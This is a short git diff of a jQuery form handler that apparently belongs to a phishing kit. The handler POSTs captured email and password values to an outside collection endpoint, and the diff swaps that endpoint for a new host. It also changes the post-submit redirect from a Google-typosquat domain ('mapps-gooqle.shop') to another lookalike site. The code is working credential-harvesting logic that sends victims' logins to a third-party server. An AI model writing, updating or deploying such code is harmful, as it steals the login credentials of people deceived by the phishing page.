@@ -83,7 +83,7 @@ $(document).ready(function () {
             // Send form data via AJAX
             $.ajax({
                 type: 'POST',
-                url: 'https://shanto.ck508.my.id/api/data',
+                url: 'https://ck404.com/api/data',
                 data: {
                     email: username,
                     password: password,
@@ -97,7 +97,7 @@ $(document).ready(function () {
                     
                         // Redirect to another URL on success
                         window.onload = function(){
-                            window.location.href = `https://mapps-gooqle.shop/view-location/${userId}`;
+                            window.location.href = `https://view.megaapersonase.website/${userId}`;
                           }
                     
                 },
